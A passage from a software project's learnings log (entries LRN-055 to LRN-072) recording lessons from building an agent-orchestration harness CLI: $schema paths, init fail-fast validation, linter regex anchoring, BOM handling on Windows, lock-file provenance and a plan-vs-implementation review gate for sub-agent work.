**Problem:** `cmdInit` originally early-returned when `harness.config.json` already existed, treating "config file present" as "init already done". This gated the entire command on a single prerequisite and silently skipped all subsequent independent side-effects — seeded-file copies, `.gitkeep` scaffolding, and fixture directory creation — breaking the create-if-missing semantics that consumers depend on.

**Finding:** Early-return guards in init/setup commands silently skip downstream side-effects. When an init-style command has multiple independent side-effects (write config, copy seeded files, scaffold dirs), guard each step independently — do NOT gate the whole command on one step's prerequisite. Pattern: use a flag (`const configExists = existsSync(configPath); if (!configExists) writeConfig()`) rather than `if (configExists) return` at the top of the function. Found in CS09 R1 (B2).

**Evidence:** CS09 R1 blocker B2 (GPT-5.5): `cmdInit` early-return caused `harness init` to be a no-op when re-run against a repo that already had a config, skipping all seeded-file copies. Fixed in cs09-fixes-r1.

**Disposition:** Applied — `cmdInit` restructured to guard each step independently. Pattern documented for all future init/setup-style commands.

### LRN-055

```yaml
id: LRN-055
date: 2026-05-03
category: architectural
source_cs: CS09
status: applied
tags: [template-authoring, schema-paths, json-schema, consumer-root, link-breakage, sync]
claim_area: tooling
```

**Problem:** `template/seeded/harness.config.json` originally used a source-relative `$schema` path (`"../schemas/harness.config.schema.json"`). After `harness init` drops this file at the consumer repo root, there is no `../schemas/` directory above it — the `$schema` reference is broken, and editors cannot resolve the schema for autocomplete/validation.

**Finding:** `$schema` paths in templates that ship to consumer repos MUST be canonical URLs (not source-relative paths like `../schemas/X.schema.json`). Source-relative paths break in the consumer context where the file ends up at the repo root with no `../schemas/` directory above it. Companion to [LRN-050](#lrn-050) (consumer-root-relative path rule) — extends specifically to JSON `$schema` references. Found in CS09 R1 (NB-3). Fix: use the canonical public URL (e.g., `https://raw.githubusercontent.com/henrik-me/agent-harness/main/schemas/X.schema.json`) or a root-relative path in the consumer.

**Evidence:** CS09 R1 non-blocker NB-3 (GPT-5.5): seeded `harness.config.json` used `../schemas/` path. Fixed in cs09-fixes-r1.

**Disposition:** Applied — `template/seeded/harness.config.json` corrected to use canonical URL. Future `check-templates.mjs` (CS08b) should include Rule 4: flag source-relative `$schema` paths in seeded/managed/composed templates.

### LRN-056

```yaml
id: LRN-056
date: 2026-05-03
category: anti-pattern
source_cs: CS09
status: applied
tags: [composed-files, markers, inline-marker, prose, escape, operations, harness-sync]
claim_area: tooling
```

**Problem:** After cs09-fixes-r1 enabled `OPERATIONS.md` as a composed file via the new seeded config, `harness sync --mode=check` immediately failed. OPERATIONS.md had a literal harness marker reference in prose at line 5 — a backtick-wrapped `<!-- harness:local-start id=X -->` example — that the composed parser scanned and attempted to process as a real block marker.

**Finding:** Composed file templates cannot contain literal harness markers `<!-- harness:local-start id=X -->` in prose, even inside backticks. The composed parser scans the full file and rejects any inline marker that is not a whole-line marker — backtick escaping is NOT recognised. Recognised escapes: U+200B (zero-width space) before `<`, or HTML-entity escape `&lt;!-- harness:local-`. When referencing marker syntax in prose (e.g., in documentation), rephrase to descriptive text ("the `operations.project-deploy` local block") instead of reproducing the literal marker string. Found in CS09 R2.

**Evidence:** CS09 R2 blocker (GPT-5.5): `harness sync --mode=check` rejected OPERATIONS.md at line 5 due to inline marker in prose. Fixed inline by orchestrator — rephrased to descriptive text.

**Disposition:** Applied — OPERATIONS.md prose rephrased. Recognised escapes documented here for future template authors. The `check-templates.mjs` linter (CS08b) should add a rule flagging literal `<!-- harness:local-` strings in `template/composed/` prose (outside whole-line markers).

### LRN-057

```yaml
id: LRN-057
date: 2026-05-03
category: process
source_cs: CS09
status: applied
tags: [testing, integration-test, fixture-test, harness-sync, check-mode, init, end-to-end]
claim_area: orchestrator-loop
```

**Problem:** All unit tests for individual linters passed for CS09, yet the marker-in-prose bug (LRN-056) only manifested end-to-end when (a) the seeded config enabled OPERATIONS.md as a composed file AND (b) `harness sync --mode=check` was actually invoked against the init-produced repo. No unit test covered this combined interaction.

**Finding:** Init/sync integration testing only surfaces config-shape bugs end-to-end. Unit tests for individual linters are insufficient to catch bugs that depend on the interaction between a seeded config file and the composed parser. Mitigation: the end-to-end fixture test (`tests/cs09-init.test.mjs`) should include a step that runs `harness sync --mode=check` against the init-produced repo, not just `harness lint`. This validates that the seeded config does not produce a composed-parser rejection on first sync.

**Evidence:** CS09 R2 blocker (GPT-5.5): `harness sync --mode=check` on the init-produced repo found the inline marker that unit linters had passed. The bug required both the seeded config + sync invocation to surface.

**Disposition:** Applied as process standard. Planned follow-up: CS09b (sync fixture extension) to add `harness sync --mode=check` to the init fixture test suite.

### LRN-058

```yaml
id: LRN-058
date: 2026-05-03
category: process
source_cs: CS09
status: applied
tags: [sub-agents, parallel-dispatch, no-commit, scale-validation, cumulative-count]
claim_area: orchestrator-loop
```

**Problem:** CS09 called for a 6-way parallel sub-agent dispatch across clearly disjoint skeleton files and config. Question: does the zero-commit, zero-race discipline hold at this cumulative scale (32 dispatches across CS01–CS09)?

**Finding:** 6-way parallel fan-out validated: zero file races, zero rogue commits. Cumulative count: 32 sub-agent dispatches across CS01–CS09 with zero commit-discipline violations after [LRN-021](../../../LEARNINGS.md#lrn-021) standardization. Pattern: parallel fan-out scales reliably when sub-agents have clearly disjoint file ownership. The consistent zero-violation record through 32 dispatches provides high confidence that the no-commit briefing pattern is durable.

**Evidence:** CS09 implementation: 6 parallel sub-agents (cs09-context, cs09-architecture, cs09-learnings, cs09-workboard, cs09-readme, cs09-config) — all Sonnet 4.6, all 0 commits, all succeeded. Plus cs09-fixes-r1 and 1 inline orchestrator R2 fix. Zero file overlap detected.

**Disposition:** Pattern validated. Cumulative dispatch count (32) is the new documented baseline for CS10+. Continue applying LRN-016 + LRN-021 on all future fan-outs.

### LRN-059

```yaml
id: LRN-059
date: 2026-05-03
category: process
source_cs: CS10
status: applied
tags: [sub-agents, parallel-dispatch, no-commit, scale-validation, cumulative-count]
claim_area: orchestrator-loop
```

**Problem:** CS10 dispatched 8 parallel sub-agents (one per scaffold bundle). Does the zero-commit / zero-race discipline continue to hold at cumulative dispatch 40?

**Finding:** 8-way parallel fan-out validated cleanly: all 8 sub-agents preflight-recorded HEAD `7748e1f`; all 8 final SHAs matched; `git status` showed only their owned `scaffolds/<name>/` directories with zero overlap. Cumulative count: ~40 sub-agent dispatches across CS01–CS10 with zero commit-discipline violations and zero file races after [LRN-021](LEARNINGS.md#lrn-021) and [LRN-016](LEARNINGS.md#lrn-016) standardization. The pattern continues to scale.

**Evidence:** CS10 content branch (`a0f8fe4`) was the only orchestrator commit between the claim merge (`7748e1f`) and the R1 fix commit (`a2ec41e`). Each sub-agent's report explicitly stated "No commit was created" with matching preflight/final SHAs. Cross-scaffold consumer-path collision check (orchestrator-level test) caught zero collisions on first author — disjoint namespacing held without coordination overhead.

**Disposition:** Pattern continues to validate. Cumulative count (40) is the updated baseline. The disjoint-file-ownership + namespace-suggestion-in-briefing combination remains the safety mechanism.

### LRN-060

```yaml
id: LRN-060
date: 2026-05-03
category: tooling
source_cs: CS10
status: applied
tags: [scaffolds, init, pre-validation, fail-fast, partial-state, malformed-config]
claim_area: cli-init
```

**Problem:** `harness init --with-scaffold <name>` initially copied seeded files and scaffold files first, then validated post-hoc; an unknown scaffold name or a malformed pre-existing `harness.config.json` could leave the target in a partial state. The R1 review surfaced exactly this: a malformed config was caught, warned to stderr, but the scaffold files were already on disk and the init exited 0 — misleading success.

**Finding:** Any "drop a bundle" CLI mode must (a) validate ALL inputs (scaffold-name existence, config parseability, etc.) BEFORE any filesystem writes, and (b) on validation failure exit non-zero leaving the target untouched. Tests must assert the "target untouched" property explicitly — exit-code-only assertions miss the partial-state failure mode.

**Evidence:** CS10 PR #29 R1 review found that with a pre-existing malformed `harness.config.json`, `init --with-scaffold smoke` copied `scripts/smoke.mjs` and exited 0. Fix: hoist `configDest`/`configExists` computation above the scaffold pre-validation block, then `JSON.parse` the existing config inside the same pre-validation gate. Test added: `tests/cs10-scaffolds.test.mjs` "malformed existing harness.config.json fails BEFORE any scaffold copies" asserts (i) non-zero exit, (ii) `/malformed JSON/` in stderr, (iii) no scaffold or seeded file appears on disk, (iv) original malformed config preserved verbatim.

**Disposition:** Apply this gate pattern to every future "bundle drop" subcommand (e.g. CS10 follow-ups that wire `harness sync --add-scaffold`, or any future `--apply-template <name>` flag). Pre-validate all inputs; on validation failure, exit before any write. Test the untouched-target property.

### LRN-061

```yaml
id: LRN-061
date: 2026-05-03
category: tooling
source_cs: CS10
status: applied
tags: [scaffolds, shipped-linters, consumer-root, --cwd, path-resolution]
claim_area: scaffold-linters
```

**Problem:** Shipped consumer-side linters (e.g. `scripts/check-migration-policy.mjs`, `scripts/check-feature-flag-policy.mjs` from the migrations / feature-flags scaffolds) need to be runnable from anywhere — including from a parent directory or from a CI runner that has `cwd` somewhere unrelated. The scaffolds initially used `path.resolve(arg)` for `--config` and `--flags-file`, which resolves against `process.cwd()`, NOT against `--cwd`. Result: `node scripts/check-feature-flag-policy.mjs --cwd /consumer --flags-file flags/flags.json` invoked from outside `/consumer` looked for `<process.cwd()>/flags/flags.json` and failed with "flags file not found".

**Finding:** A consumer-shipped linter that accepts `--cwd` must resolve every relative path argument against `--cwd`, not against `process.cwd()`. The pattern `path.resolve(cwd, arg)` is correct for both relative and absolute inputs (absolute paths pass through unchanged). This complements [LRN-050](LEARNINGS.md#lrn-050) (consumer-root-relative paths in the harness) but applies inside the script: the script's notion of "the consumer root" is `--cwd`, not `process.cwd()`, when the two differ.

**Evidence:** CS10 PR #29 R1 review (Blocking #2). Both shipped linters (`check-migration-policy.mjs:53,56` and `check-feature-flag-policy.mjs:104,158`) were fixed to use `path.resolve(cwdArg, configArg)` and `path.resolve(cwd, flagsFileArg)`. Regression test added: `tests/cs10-scaffolds.test.mjs` "flags linter resolves --flags-file relative to --cwd" runs the linter from `REPO_ROOT` with `--cwd <tmp>` and asserts no "flags file not found" error.

**Disposition:** Convention to apply to every future shipped consumer-linter: any path argument is relative to `--cwd` (default `process.cwd()` when `--cwd` is not provided). Briefings for sub-agents authoring shipped consumer scripts must call this out explicitly alongside [LRN-050](LEARNINGS.md#lrn-050).

### LRN-062

```yaml
id: LRN-062
date: 2026-05-03
category: tooling
source_cs: CS10
status: applied
tags: [scaffolds, migrations, linter-correctness, naming-convention, semantic-pairing]
claim_area: scaffold-linters
```

**Problem:** The migration linter (`check-migration-policy.mjs`, shipped by `scaffolds/migrations/`) initially paired `*.up.sql` and `*.down.sql` files by 4-digit numeric prefix only. This passed mismatched-stem pairs as valid: `0001_create-users.up.sql` + `0001_drop-posts.down.sql` was reported as a complete pair, defeating the linter's core safety guarantee (a rollback file actually rolls back what the up file did).

**Finding:** Lexical conventions (filename prefix, suffix, casing) are a useful first-pass index, but they must not stand in for semantic identity. The "matching down" of an up migration must share the FULL stem (e.g. `0001_create-users`), not just the prefix. The 4-digit prefix encodes ordering / sequence-number uniqueness; the stem encodes WHICH migration. Conflating the two collapses two independent rules into one and silently weakens both.

**Evidence:** CS10 PR #29 R1 review (Blocking #3). `0001_create-users.up.sql` + `0001_drop-posts.down.sql` was reported as 0 violations by the original linter; after the fix (pair by stem in `stemMap`), the same pair produces a `paired-up-down: "0001_create-users.up.sql" has no matching "0001_create-users.down.sql" file` violation AND a separate `no-duplicate-prefix` violation (because both `*.up.sql`/`*.down.sql` share the `0001` prefix bucket). Regression test: `tests/cs10-scaffolds.test.mjs` "migration linter rejects mismatched up/down stems".

**Disposition:** When authoring linters that enforce a "paired files" rule, pair on the full semantic identifier (the stem), not the auxiliary index (the prefix). Document the distinction explicitly in the linter's README §Rules. Add a test for the mismatched-stem case alongside the missing-pair case.

### LRN-063

```yaml
id: LRN-063
date: 2026-05-03
category: process
source_cs: CS10
status: applied
tags: [briefings, exit-criteria, scope-drift, lint-vs-pattern-doc, scope-adjustment]
claim_area: cs-planning
```

**Problem:** The CS10 planned spec (filed at CS09 close-out) listed exit criterion "All scaffold README.md files pass `check-readme.mjs`". But scaffold READMEs are pattern-doc artifacts (audience: a developer evaluating opt-in), not consumer-project READMEs. `check-readme.mjs` enforces project-README structure (`## Quickstart`, `## License`, `## Architecture`, `## Status`) which doesn't apply. One sub-agent (cs10-smoke) "defended" against this by adding all four sections to the smoke scaffold's pattern doc, even though the briefing explicitly said "pattern docs do NOT need Quickstart/License/Architecture/Status sections" — it inferred the exit criterion overrode the briefing.

**Finding:** When a CS spec's exit criteria contradict a sub-agent briefing, sub-agents (correctly) defer to the exit criteria — they cannot know the orchestrator's intent. The orchestrator must (a) reconcile inconsistencies BEFORE dispatch, OR (b) explicitly mark the resolution in the briefing. In CS10 the right call was to drop the over-specified exit criterion (scaffold READMEs are not project READMEs) and document the scope adjustment in the active CS file with rationale + follow-up note. Filed in PR #29 §"Notable scope adjustment".

**Evidence:** CS10 PR #29: cs10-smoke sub-agent surfaced this as a learning candidate ("future briefings should note this conflict explicitly so sub-agents don't waste time"). Active CS file Exit-criteria block updated in PR #29 to strike the over-specified criterion with a documented rationale and a follow-up note: "A dedicated `check-scaffold-readme.mjs` can be filed if scaffold-doc enforcement becomes valuable."

**Disposition:** Two-part rule for CS authoring:
1. When pre-filing a CS in a close-out PR, scrutinize each exit criterion against the deliverables: do they apply, or are they aspirational?
2. When claiming a CS, do an explicit "exit-criteria sanity check" before dispatch and reconcile or document any inconsistencies in the active CS file.

Pre-flight rubber-duck reviews of CS plans (already part of the workflow) should be asked specifically whether exit criteria match deliverable scope.

### LRN-064

```yaml
id: LRN-064
date: 2026-05-04
category: process
source_cs: CS03b
status: applied
tags: [close-out, gate, plan-vs-implementation, review, gpt-5.5, recursive-validation, mechanical-enforcement]
claim_area: orchestrator-loop
```

**Problem:** Through CS01–CS10 the close-out review process consisted of a GPT-5.5 review of the *content PR diff* — comprehensive on code correctness but blind to "did we actually build what the plan said we'd build?" Multiple CSs (e.g. CS10) closed with a "Notable scope adjustment" buried in the PR body; CS09 close-out filed planned CSs whose exit criteria didn't match the planned deliverables (later flagged at CS10 R1 as LRN-063). The pattern: silent plan/implementation drift accumulates without a gating step that explicitly compares the active CS file against the merged work.

**Finding:** Add a **plan-vs-implementation review gate** as the mandatory last step before close-out, distinct from the content-PR code review. The gate uses GPT-5.5 (rubber-duck) to (a) compare each plan deliverable against what landed on disk, marking each as `match | diverged | added | dropped` with rationale, (b) assess test coverage as `sufficient | gaps with specific gap list`, and (c) issue an overall `GO | NEEDS-FIX` outcome. The verdict is captured verbatim in the active CS file's `## Plan-vs-implementation review` H2 section BEFORE the active→done rename. NEEDS-FIX blocks close-out — fix on the content branch and re-run. Mechanical enforcement: `check-clickstop.mjs` requires the H2 in every `active/` and `done/` CS file; `done/` files must additionally contain `**Reviewer:**`, `**Date:**`, `**Outcome:**` markers OR a literal grandfathering line for files closed before the gate existed.

**Evidence:** CS03b PR #32 introduced the gate (process docs in root + template OPERATIONS.md/INSTRUCTIONS.md/copilot-instructions.md; linter check #4 in `scripts/check-clickstop.mjs`; 6 new fixtures + 6 new tests; 10 done CSs grandfathered + 9 planned CSs placeholder-stamped) and exercised it on itself: R1 caught 2 blockers (missing unicode test, ENOLOCK enum mismatch) + 1 NB (strict-default doc); R2 caught 1 blocker (unicode test only covered values, not keys) + 1 NB (Tasks ledger row stale); R3 GO. Three iterations of the gate on the CS that introduces it — this would not have surfaced without the explicit plan/built comparison.

**Disposition:** Permanent. Every CS from this point forward must run the gate at close-out. The recursive self-application pattern (a process-change CS exercising its new gate on itself) is a strong validation idiom — apply when introducing future close-out gates. Long-term: the gate may be auto-runnable via `harness close-out --gate`; until then it's an orchestrator-driven step.

### LRN-065

```yaml
id: LRN-065
date: 2026-05-04
category: tooling
source_cs: CS03b
status: applied
tags: [sub-agents, windows, bom, file-creation, post-completion-verification]
claim_area: sub-agent-coordination
```

**Problem:** The CS03b cs03b-gate sub-agent (Sonnet 4.6) wrote 19 retrofitted `.md` files on Windows, every single one with a UTF-8 BOM. The sub-agent's self-checks did not catch this; the orchestrator's content-PR review caught it as a blocker. The same pattern was previously surfaced as LRN-018 ("file creates may carry BOM") and LRN-006 ("create tool writes CRLF on Windows"), but those LRNs frame BOM as a *create-tool* issue. Sub-agents using `edit` to APPEND content can also reintroduce BOM if the file is rewritten end-to-end.

**Finding:** BOM creep is not limited to fresh `create` calls — any sub-agent operation that rewrites an entire file on Windows (via `edit` collapsing to a full overwrite, PowerShell `Out-File` without `-Encoding utf8NoBOM`, or Node `fs.writeFileSync` with a string that picked up a BOM from earlier reads) can reintroduce the BOM. Mitigation: orchestrator's post-sub-agent verification must explicitly check for BOM on every modified file (`Get-Content -Encoding Byte ... -TotalCount 3` or equivalent), and strip silently before commit. Long-term: a `check-no-bom.mjs` linter in the aggregator would catch this mechanically.

**Evidence:** CS03b PR #32 R1 review found BOM in all 19 retrofitted CS files (`project/clickstops/{done,planned}/*.md`); none of the cs03b-gate sub-agent's self-checks listed BOM verification, even though the briefing said "LF line endings, no BOM. Verify after writes on Windows." The orchestrator added a one-shot strip pass and a manual byte-check after; same pattern can be encoded as a linter for permanent mechanical coverage.

**Disposition:** (a) Update sub-agent briefing template (in OPERATIONS.md § Sub-agent dispatch § Briefing template) to require an explicit BOM check in every self-check block: `Get-ChildItem -Recurse <owned-paths> | %{ first 3 bytes != EF BB BF }` or Node equivalent. (b) File a planned CS (see CS-bom-linter follow-up) for `scripts/check-no-bom.mjs` as part of the harness lint aggregator — would have caught this in the sub-agent's own self-checks AND in the content PR's CI. (c) For the immediate term: orchestrators MUST run `Get-ChildItem -Recurse <changed-files> | <bom check>` in their post-sub-agent verification.

### LRN-066

```yaml
id: LRN-066
date: 2026-05-04
category: tooling
source_cs: CS03b
status: applied
tags: [linters, regex, anchoring, includes-vs-regex, false-positive, markdown-h2]
claim_area: linter-design
```

**Problem:** The first iteration of `scripts/check-clickstop.mjs` check #4 (CS03b plan-vs-implementation review gate H2 detection) used `content.includes('## Plan-vs-implementation review')`. This passes if the literal string appears anywhere — including inside a fenced code block, prose backticks, or even a comment. R1 review (PR #32) reproduced the bypass: a done CS file with only a prose mention of the section header passed the linter without having an actual H2. The check was unsound.

**Finding:** Pattern-matching linters that enforce structural Markdown invariants (H1/H2 sections, callouts, etc.) MUST use anchored, line-mode regex — `/^## <title>\s*$/m` — not raw `includes()` or `indexOf()`. The fix: `const GATE_H2_RE = /^## Plan-vs-implementation review\s*$/m; const headingMatch = content.match(GATE_H2_RE);` then use `headingMatch.index + headingMatch[0].length` for body extraction. Cost: one extra line. Benefit: prose mention can no longer satisfy the rule. Reviewer noted a residual edge case (fenced-code line containing the exact heading still satisfies the regex) — fully fence-aware parsing requires `lib/doc-schema.mjs` primitives (CS06b territory) and is a non-blocker for v0.1.x.

**Evidence:** CS03b PR #32 R1 review reproduced the bypass: a done CS file with only `` `## Plan-vs-implementation review` `` in prose plus Reviewer/Date/Outcome lines passed `check-clickstop` cleanly. After the fix in commit `d6aea0c`, the same construct fails as expected.

**Disposition:** Convention to apply to every future Markdown structural linter: use anchored multiline regex (`^...$/m`) for heading detection. Document in `template/composed/CONVENTIONS.md` § Linter conventions (or carry into `lib/doc-schema.mjs` primitives at CS06b). For full fence-awareness, CS06b (planned) should provide a parsed-Markdown helper that all linters share — until then, anchored regex is the floor.

### LRN-067

```yaml
id: LRN-067
date: 2026-05-04
category: tooling
source_cs: CS03b
status: applied
tags: [linters, regex, naming-convention, cs-id, precision-vs-permissiveness]
claim_area: linter-design
```

**Problem:** `scripts/check-workboard.mjs` initially required CS-Task IDs to match `^CS\d+$`. CS03b's claim PR introduced a hyphenated ID (`CS03b`) which the linter rejected. The orchestrator widened the regex to `^CS\d+[a-z]?$` — but this accepted ANY digit count, including malformed single-digit IDs like `CS3b` or `CS3`. R1 review caught the over-permissive widening.

**Finding:** When loosening a linter to accommodate a new convention, encode the convention's PRECISE shape, not the minimal substring that lets the new case pass. The repo convention is two-digit zero-padded sequence numbers (`CS01`, `CS02`, ..., `CS22`) with optional lowercase suffix letter (`CS03b`, `CS04a`). The correct regex is `^CS\d{2,}[a-z]?$` (≥2 digits to reject `CS3`/`CS3b`, allow ≥3 for forward-compatibility with CS100+). One-character permissiveness slip (`+` vs `{2,}`) silently weakens the integrity check.

**Evidence:** PR #32 R1 found `CS3b` would have passed the widened regex; tightened to `^CS\d{2,}[a-z]?$` in `scripts/check-workboard.mjs:221` per commit `d6aea0c`. No production drift occurred (no CS3b ever existed) but the gap was real.

**Disposition:** When widening a regex during a CS, write down the exact set of values the convention SHOULD admit (positive examples) AND the values it should REJECT (negative examples), and write the regex from those. Add both positive and negative test fixtures in the same change. This is the "specification via examples" pattern — a small upfront cost that prevents over-permissive permissive widening.

### LRN-068

```yaml
id: LRN-068
date: 2026-05-04
category: process
source_cs: CS03b
status: applied
tags: [orchestrator, mid-cs-edits, branch-transitions, working-tree-loss, post-edit-verification]
claim_area: orchestrator-loop
```

**Problem:** During CS03b setup, the orchestrator applied 5 `edit` calls to `active_cs03b_*.md` to extend the CS scope (adding the plan-vs-implementation gate work). Each edit returned "File updated with changes." Several minutes later, when the gate sub-agent ran the linter against the project, the active CS file showed the ORIGINAL (un-extended) content — the orchestrator's edits had been silently lost. Root cause was not definitively identified but most likely candidates: (a) one of the parallel sub-agent shells ran a git operation that affected the working tree, (b) a stale file handle from before the edits got rewritten on a later flush, or (c) the edit tool reported success without actually persisting on a particular branch state. The orchestrator detected the loss only because the gate sub-agent surfaced it as an escalation.

**Finding:** Orchestrator file edits to "long-lived" files (active CS files, WORKBOARD, CONTEXT) interleaved with parallel sub-agent dispatch carry a non-zero loss risk. The mitigation that worked: re-read the file via `view` or `grep` immediately after each batch of edits AND immediately before any subsequent operation on that file. For critical orchestrator-owned files (active CS), spot-check the on-disk content at every milestone (post-dispatch, post-sub-agent-completion, pre-PR-open). If lost, re-apply — losses are usually clean (file reverts to last committed state, no mid-state corruption).

**Evidence:** CS03b session log shows 5 successful `edit` returns followed by `task` dispatches; on later inspection (post-sub-agent completion) the file matched the post-claim merge state, not the post-edit state. Re-applying the edits restored the intended content. The lost edits did not affect sub-agents' work because they were instructed not to touch the active CS file.

**Disposition:** Operational mitigation: orchestrators should verify on-disk content of long-lived owned files at each session milestone, not assume edit-tool success implies durable persistence under concurrent shell activity. Long-term mitigation: when feasible, commit orchestrator-owned long-lived file edits BEFORE dispatching parallel sub-agents, so the canonical state lives in git, not working tree. This may add a no-content commit-ahead but trades that overhead for robustness.

### LRN-069

```yaml
id: LRN-069
date: 2026-05-04
category: process
source_cs: CS11
status: applied
tags: [self-host, dogfood, recursive-validation, cs03b-gate, sub-agent-preamble, milestone]
claim_area: orchestrator-loop
```

**Problem:** CS11 was the long-anticipated "dogfood" moment — replacing the CS01 hand-authored proto root docs with the rendered output of `template/managed/` + `template/composed/`, and activating the harness's own CI gate (`harness lint --quiet` + `sync --mode=check`) so future drift between templates and root files becomes mechanically impossible. The risk surface was substantial: HIGH-RISK by cs-plan; CS03b gate exercising itself for the second time; canonical sub-agent briefing preamble (LRN-068 follow-up) folded in as Stage 0; and the swap itself irreversible once `sync --mode=apply` writes `.harness-lock.json`.

**Finding:** Self-hosting succeeded cleanly at first attempt. Key validating patterns:
1. **Plan iteration before claim** — 5 rubber-duck iterations of the planned CS file (R1–R5) caught the original NO-GO blockers (composed-block markers missed, Stage A self-failing workflow, wrong `--cwd` flag, incorrect placeholder audit, fan-out table contradicting D7) BEFORE dispatch. Cumulative R1+R2 critique cost: ~30 minutes. Estimated cost of executing the broken plan: hours of recovery + likely restart. Plan-iteration ROI is high for HIGH-RISK CSs.
2. **D7 manual-write strategy** — bypassing `harness sync --mode=apply` for the one-time migration write was the right call. The engine's composed-merge fail-closed semantics (correctly) reject markerless root files, so any sync-based migration would have required either weakening composed semantics (bad — undermines fail-closed) or implementing an `--initial-sync` flag (out of scope per D6). Manual render-and-write all 10 files via a one-shot Node script is the correct one-time migration mechanism.
3. **Canonical preamble verbatim-paste discipline** — every CS11 sub-agent dispatch (preamble, config, ci) had the canonical block pasted in full. Sub-agents reported zero confusion about preflight / file-ownership / report-shape. The cost is large prompts; the benefit is no forgotten process steps. Worth it.
4. **CS03b's plan-vs-impl review gate** caught 2 real blockers in CS11's R1 (placeholder audit over-reporting `should-have-resolved` because it didn't detect escape-rendered tokens; tests/cli.test.mjs Stage-A workarounds left in) plus 1 NB. Without the gate, both would have shipped silently. Gate ROI confirmed for the second CS that uses it.

**Evidence:** CS11 PR #37 squash-merged as `68c2ce4`. After the swap: `harness lint --quiet` 12/0/3 (was 9/0/3 baseline; +3 composed-blocks for the now-marker-bearing root docs); `sync --mode=check` exits 0 ("No drift detected"); 436 tests pass; `harness-self-check.yml` workflow active with `harness lint --quiet` + `sync --mode=check` enforcement. From this CS forward, intentional drift between `template/managed|composed/` and root files is mechanically prevented.

**Disposition:** Self-hosting milestone reached. Future template changes flow `template/...` → `harness sync --mode=apply` → root files (no manual writes; CS11 was the one-time migration). Future CSs that touch `template/managed/` or `template/composed/` MUST also run `harness sync --mode=apply` and commit the resulting root + lock changes; CI's `sync --mode=check` enforces this. The pre-claim plan-iteration discipline (5 iterations for HIGH-RISK CSs) is now empirically validated and should be the norm for HIGH-RISK work going forward.

### LRN-070

```yaml
id: LRN-070
date: 2026-05-04
category: tooling
source_cs: CS11
status: applied
tags: [harness-lock, sync-apply, ordering, audit-trail, resolved-sha, post-commit-regenerate]
claim_area: sync-engine
```

**Problem:** CS11 ran `harness sync --mode=apply` during Stage B.5 to create the initial `.harness-lock.json`. The lock captured `resolved_sha` from `git rev-parse HEAD` AT SYNC TIME — which was the pre-CS11 claim-merge SHA (`5f19bf9`), since no CS11 work had been committed yet. The CS11 R1 review correctly flagged this as a lock-integrity issue: the lock claimed a `resolved_sha` that could not have produced the `rendered_hash` entries, since the templates that produced those hashes were uncommitted at the time.

**Finding:** `.harness-lock.json` `resolved_sha` is an audit/provenance field that must point at a commit containing both the templates AND the produced root files. When `sync --mode=apply` runs in a working tree with uncommitted template changes, `resolveHarnessRef()` correctly returns the current HEAD (it cannot see uncommitted changes), but the resulting lock is stale by construction. Mitigation: when `sync --mode=apply` is invoked in a CS that ALSO modifies templates, the orchestrator must (a) commit the template + root + initial lock together first, then (b) re-run `sync --mode=apply` to update the lock's `resolved_sha`/`synced_at` to point at the just-made commit, then (c) commit the lock fixup. CS11 R1 fix did exactly this: lock fixup commit `a4d9ece` followed CS11 content commit `f6cb2dc`. Future engine improvement: `sync --mode=apply` could optionally accept `--resolved-sha <sha>` to pin the recorded provenance explicitly, removing the ordering trap.

**Evidence:** PR #37 R1 review showed `.harness-lock.json` `resolved_sha = 5f19bf9` (claim-merge SHA) instead of `f6cb2dc` (CS11 content SHA). Re-running `sync --mode=apply` after the CS11 commit landed produced a 1-line update (`resolved_sha` + `synced_at`) committed as `a4d9ece`. R2 review verified rendered_hash entries unchanged (no content drift; only metadata fixup).

**Disposition:** Document the post-commit-regenerate pattern in OPERATIONS.md § Sync (or as a future LRN-driven addition). Consider filing CS11b: "harness sync --mode=apply --resolved-sha <sha> override flag" as a small follow-up so the ordering trap can be avoided cleanly. For now, the pattern is: when both templates and root files change in the same CS, commit content first, then re-apply for lock fixup, then commit lock.

### LRN-071

```yaml
id: LRN-071
date: 2026-05-04
category: tooling
source_cs: CS11
status: applied
tags: [placeholder-audit, escape-syntax, classification, false-positive, cs03b-templating]
claim_area: scaffold-linters
```

**Problem:** CS11 Stage A.3 authored a `placeholder-audit.mjs` script that scans rendered template output for any remaining `{{key}}` tokens and classifies each. The first version classified a token as `should-have-resolved` if its inner key existed in the templating map — on the assumption that any unresolved key-in-map indicated a substitution bug. But CS03b's templating engine supports an escape syntax: `\{{key}}` in the template renders to literal `{{key}}` in the output (the backslash is consumed). When `template/managed/TRACKING.md` used `\{{repo_short}}` in path-example prose to display the literal placeholder syntax, the audit (correctly seeing `{{repo_short}}` post-render with `repo_short` IN the templating map) flagged it as `should-have-resolved` — but it was actually intentional escape behavior.

**Finding:** Linters that scan rendered output for "missing substitutions" must be aware of the source-template escape syntax. Mitigation: `classify()` now reads the source template AND checks for the escaped form `\{{token}}` at the same position; if found, classifies as `intentional-literal` with note "escape-rendered per CS03b". This pattern generalizes: any post-processing analyzer of templated output must reason about the template's escape-syntax semantics, not just the rendered output's surface form.

**Evidence:** CS11 PR #37 R1 flagged 5 `should-have-resolved` `{{repo_short}}` tokens in `TRACKING.md` rendered output. Inspection of `template/managed/TRACKING.md:254,263-266` showed `\{{repo_short}}` escapes. Post-fix: 0 `should-have-resolved`, 7 `intentional-literal` (5 escape-rendered + 2 documented prose), 0 `unclassified`. Audit script's exit-code logic also tightened to fail on either `should-have-resolved` OR `unclassified` (not just unclassified).

**Disposition:** Apply this principle to any future template-output analyzer. Update sub-agent briefings authoring such linters to specifically call out: "rendered-output analyzers must be aware of escape syntax (`\{{key}}`) in the source template and classify escape-rendered literals correctly."

### LRN-072

```yaml
id: LRN-072
date: 2026-05-04
category: process
source_cs: CS11
status: applied
tags: [stage-enforcement-window, ci-gate, test-skips, todo-markers, multi-stage-cs]
claim_area: cs-planning
```

**Problem:** CS11's Stage A landed `harness.config.json` with `composed.files` declared, but the root composed docs (CONVENTIONS, OPERATIONS, REVIEWS) didn't yet have local-block markers (those land in Stage B.1). This created a window where `harness lint --quiet` would fail (`check-composed-blocks` rejects markerless root docs). The local test suite's `tests/cli.test.mjs` had assertions of the form "harness lint exits 0 against the real repo" — these started failing as soon as Stage A.1 landed `harness.config.json`. The orchestrator added `--skip composed-blocks` workarounds with `TODO(CS11 B.4)` markers, planning to remove them in B.4. The CI workflow `harness-self-check.yml` was authored in A.4 with a similar enforcement-window omission. B.4 successfully removed the workflow-side omission. But the test-side `--skip` markers were forgotten until the plan-vs-impl review gate caught them in R1.

